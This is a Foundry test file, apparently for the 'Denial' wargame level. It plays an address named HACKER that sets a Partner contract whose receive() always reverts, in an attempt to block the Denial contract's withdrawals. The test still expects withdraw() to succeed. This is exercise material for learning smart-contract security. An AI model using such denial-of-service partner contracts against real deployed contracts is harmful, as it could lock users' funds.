// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Denial.sol";

contract DenialTest is Test {
    Denial private denial;
    Partner private partner;
    address private constant HACKER = address(0x3);

    function setUp() external {
        denial = new Denial();
        partner = new Partner();
        vm.deal(HACKER, 5e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        denial = new Denial();
        (bool success,) = address(denial).call{value: 1e18}("");
        require(success, "tx failed");

        denial.setWithdrawPartner(address(partner));
        assertEq(address(denial).balance, 1e18);
        denial.withdraw();
        assertEq(address(denial).balance, 99e16);
    }

}

contract Partner {
    receive() external payable {
        assert(false);
    }
}